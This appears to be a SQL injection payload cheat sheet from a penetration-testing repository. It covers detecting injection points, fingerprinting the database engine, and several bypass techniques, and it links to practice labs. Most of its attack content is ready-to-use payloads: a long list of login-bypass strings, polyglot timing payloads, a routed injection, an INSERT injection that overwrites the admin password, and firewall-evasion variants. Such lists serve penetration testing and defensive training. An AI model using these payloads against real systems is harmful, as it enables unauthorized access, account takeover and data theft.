# SQL Injection

> A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application.

Attempting to manipulate SQL queries may have goals including:

- Information Leakage
- Disclosure of stored data
- Manipulation of stored data
- Bypassing authorization controls

## Summary

* [CheatSheets](#cheatsheets)
    * [MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
    * [MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
    * [OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)
    * [PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
    * [SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
    * [Cassandra Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md)
    * [HQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/HQL%20Injection.md)
    * [DB2 Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/DB2%20Injection.md)
    * [SQLmap](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLmap%20Cheatsheet.md)
* [Entry point detection](#entry-point-detection)
* [DBMS Identification](#dbms-identification)
* [Authentication bypass](#authentication-bypass)
    * [Authentication Bypass (Raw MD5 SHA1)](#authentication-bypass-raw-md5-sha1)
* [Polyglot injection](#polyglot-injection-multicontext)
* [Routed injection](#routed-injection)
* [Insert Statement - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
* [Generic WAF Bypass](#generic-waf-bypass)
    * [White spaces alternatives](#white-spaces-alternatives)
    * [No Comma Allowed](#no-comma-allowed)
    * [No Equal Allowed](#no-equal-allowed)
    * [Case modification](#case-modification)


## Tools

* [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) - Automatic SQL injection and database takeover tool
* [r0oth3x49/ghauri](https://github.com/r0oth3x49/ghauri) - An advanced cross-platform tool that automates the process of detecting and exploiting SQL injection security flaws


## Entry point detection

Detecting the entry point in SQL injection (SQLi) involves identifying locations in an application where user input is not properly sanitized before it is included in SQL queries.

* **Error Messages**: Inputting special characters (e.g., a single quote ') into input fields might trigger SQL errors. If the application displays detailed error messages, it can indicate a potential SQL injection point.
  * Simple characters: `'`, `"`, `;`, `)` and `*`
  * Simple characters encoded: `%27`, `%22`, `%23`, `%3B`, `%29` and `%2A`
  * Multiple encoding: `%%2727`, `%25%27`
  * Unicode characters: `U+02BA`, `U+02B9`
      * MODIFIER LETTER DOUBLE PRIME (`U+02BA` encoded as `%CA%BA`) is transformed into `U+0022` QUOTATION MARK (`)
      * MODIFIER LETTER PRIME (`U+02B9` encoded as `%CA%B9`) is transformed into `U+0027` APOSTROPHE (')

* **Tautology-Based SQL Injection**: By inputting tautological (always true) conditions, you can test for vulnerabilities. For instance, entering `admin' OR '1'='1` in a username field might log you in as the admin if the system is vulnerable.
  * Merging characters
    ```sql
    `+HERP
    '||'DERP
    '+'herp
    ' 'DERP
    '%20'HERP
    '%2B'HERP
    ```
  * Logic Testing
    ```sql
    page.asp?id=1 or 1=1 -- true
    page.asp?id=1' or 1=1 -- true
    page.asp?id=1" or 1=1 -- true
    page.asp?id=1 and 1=2 -- false
    ```

* **Timing Attacks**: Inputting SQL commands that cause deliberate delays (e.g., using `SLEEP` or `BENCHMARK` functions in MySQL) can help identify potential injection points. If the application takes an unusually long time to respond after such input, it might be vulnerable.


## DBMS Identification

### DBMS Identification Keyword Based

Certain SQL keywords are specific to particular database management systems (DBMS). By using these keywords in SQL injection attempts and observing how the website responds, you can often determine the type of DBMS in use.

| DBMS                | SQL Payload                     |
| ------------------- | ------------------------------- |
| MySQL               | `conv('a',16,2)=conv('a',16,2)` |
| MySQL               | `connection_id()=connection_id()` |
| MySQL               | `crc32('MySQL')=crc32('MySQL')` |
| MSSQL               | `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)` |
| MSSQL               | `@@CONNECTIONS>0` |
| MSSQL               | `@@CONNECTIONS=@@CONNECTIONS` |
| MSSQL               | `@@CPU_BUSY=@@CPU_BUSY` |
| MSSQL               | `USER_ID(1)=USER_ID(1)` |
| ORACLE              | `ROWNUM=ROWNUM` |
| ORACLE              | `RAWTOHEX('AB')=RAWTOHEX('AB')` |
| ORACLE              | `LNNVL(0=123)` |
| POSTGRESQL          | `5::int=5` |
| POSTGRESQL          | `5::integer=5` |
| POSTGRESQL          | `pg_client_encoding()=pg_client_encoding()` |
| POSTGRESQL          | `get_current_ts_config()=get_current_ts_config()` |
| POSTGRESQL          | `quote_literal(42.5)=quote_literal(42.5)` |
| POSTGRESQL          | `current_database()=current_database()` |
| SQLITE              | `sqlite_version()=sqlite_version()` |
| SQLITE              | `last_insert_rowid()>1` |
| SQLITE              | `last_insert_rowid()=last_insert_rowid()` |
| MSACCESS            | `val(cvar(1))=1` |
| MSACCESS            | `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0` |


### DBMS Identification Error Based

Different DBMSs return distinct error messages when they encounter issues. By triggering errors and examining the specific messages sent back by the database, you can often identify the type of DBMS the website is using.

| DBMS                | Example Error Message                                                                    | Example Payload |
| ------------------- | -----------------------------------------------------------------------------------------|-----------------|
| MySQL               | `You have an error in your SQL syntax; ... near '' at line 1`                            | `'`             |
| PostgreSQL          | `ERROR: unterminated quoted string at or near "'"`                                       | `'`             |
| PostgreSQL          | `ERROR: syntax error at or near "1"`                                                     | `1'`            |
| Microsoft SQL Server| `Unclosed quotation mark after the character string ''.`                                 | `'`             |
| Microsoft SQL Server| `Incorrect syntax near ''.`                                                              | `'`             |
| Microsoft SQL Server| `The conversion of the varchar value to data type int resulted in an out-of-range value.`| `1'`            |
| Oracle              | `ORA-00933: SQL command not properly ended`                                              | `'`             |
| Oracle              | `ORA-01756: quoted string not properly terminated`                                       | `'`             |
| Oracle              | `ORA-00923: FROM keyword not found where expected`                                       | `1'`            |



## Authentication bypass

```sql
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';--
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

## Authentication Bypass (Raw MD5 SHA1)

When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.

```php
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```

Allowing an attacker to craft a string with a `true` statement such as `' or 'SOMETHING`

```php
md5("ffifdyop", true) = 'or'6�]��!r,��b
sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
```

Challenge demo available at [http://web.jarvisoj.com:32772](http://web.jarvisoj.com:32772)

## Polyglot injection (multicontext)

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/

/* MySQL only */
IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
```

## Routed injection

```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```

## Insert Statement - ON DUPLICATE KEY UPDATE

ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:

```sql
Inject using payload:
  attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --

The query would look like this:
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");

This query will insert a row for the user “attacker_dummy@example.com”. It will also insert a row for the user “admin@example.com”.
Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to "bcrypt_hash_of_qwerty".

After this, we can simply authenticate with “admin@example.com” and the password “qwerty”!
```


## Generic WAF Bypass

### White spaces alternatives

* No space allowed (`%20`) - bypass using whitespace alternatives
  ```sql
  ?id=1%09and%091=1%09--
  ?id=1%0Dand%0D1=1%0D--
  ?id=1%0Cand%0C1=1%0C--
  ?id=1%0Band%0B1=1%0B--
  ?id=1%0Aand%0A1=1%0A--
  ?id=1%A0and%A01=1%A0--
  ```
* No whitespace - bypass using comments
  ```sql
  ?id=1/*comment*/and/**/1=1/**/--
  ```
* No Whitespace - bypass using parenthesis
  ```sql
  ?id=(1)and(1)=(1)--
  ```
* Whitespace alternatives by DBMS
  ```sql
  -- Example of query where spaces were replaced by ascii characters above 0x80
  ♀SELECT§*⌂FROM☺users♫WHERE♂1☼=¶1‼
  ```

| DBMS       | ASCII characters in hexadicimal |
| ---------- | ------------------------------- |
| SQLite3    | 0A, 0D, 0C, 09, 20 |
| MySQL	5    | 09, 0A, 0B, 0C, 0D, A0, 20 |
| MySQL	3	   | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |
| PostgreSQL | 0A, 0D, 0C, 09, 20 |
| Oracle 11g | 00, 0A, 0D, 0C, 09, 20 |
| MSSQL      | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 |

 
### No Comma Allowed
 
Bypass using OFFSET, FROM and JOIN

```sql
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```


### No Equal Allowed

Bypass using LIKE/NOT IN/IN/BETWEEN

```sql
?id=1 and substring(version(),1,1)like(5)
?id=1 and substring(version(),1,1)not in(4,3)
?id=1 and substring(version(),1,1)in(4,3)
?id=1 and substring(version(),1,1) between 3 and 4
```


### Case modification
 
* Bypass using uppercase/lowercase (see keyword AND)
  ```sql
  ?id=1 AND 1=1#
  ?id=1 AnD 1=1#
  ?id=1 aNd 1=1#
  ```
* Bypass using keywords case insensitive / Bypass using an equivalent operator
  ```sql
  AND   -> &&
  OR    -> ||
  =     -> LIKE,REGEXP, BETWEEN, not < and not >
  > X   -> not between 0 and X
  WHERE -> HAVING
  ```


## Labs 

* [PortSwigger - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
* [PortSwigger - SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
* [PortSwigger - SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
* [PortSwigger - SQL Labs](https://portswigger.net/web-security/all-labs#sql-injection)


## References

* [Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection - Not So Secure - February 9, 2018](https://web.archive.org/web/20180209143119/https://www.notsosecure.com/analyzing-cve-2018-6376/)
* [Manual SQL Injection Discovery Tips - Gerben Javado - August 26, 2017](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
* [NetSPI SQL Injection Wiki - NetSPI - December 21, 2017](https://sqlwiki.netspi.com/)
* [PentestMonkey's mySQL injection cheat sheet - @pentestmonkey - August 15, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
* [SQLi Cheatsheet - NetSparker - March 19, 2022](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
* [SQLi in INSERT worse than SELECT - Mathias Karlsson - Feb 14, 2017](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
* [SQLi Optimization and Obfuscation Techniques - Roberto Salgado - 2013](https://web.archive.org/web/20221005232819/https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2013/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf)
* [The SQL Injection Knowledge base - Roberto Salgado - May 29, 2013](https://websec.ca/kb/sql_injection)